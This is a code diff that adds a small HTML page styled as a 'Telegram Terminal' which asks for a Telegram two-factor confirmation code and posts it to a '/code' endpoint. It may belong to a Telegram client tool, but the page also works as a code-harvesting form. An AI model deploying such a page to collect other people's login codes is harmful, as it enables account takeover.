@@ -1,1 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Terminal - 2FA</title>
+    <style>
+        body { background:#000; color:#0f0; font-family: 'Courier New'; padding:20px; }
+        input { background:#000; color:#0f0; border:none; font-family:inherit; font-size:1em; width:100%; }
+        .blink { animation: blink 1s steps(2, start) infinite; }
+        @keyframes blink { to { visibility: hidden; } }
+        .spinner { animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<pre>
+Phone authenticated.
+Sending confirmation code...<span class="spinner">↺</span>
 
+[OK] Code sent to your registered devices
+[OK] Waiting for 2FA input...
+
+$ code: <form action="/code" method="post" style="display:inline;">
+<input type="text" name="code" autofocus required>
+<input type="submit" value="submit" style="display:none;">
+</form>
+<span class="blink">_</span>
+</pre>
+</body>
+</html>
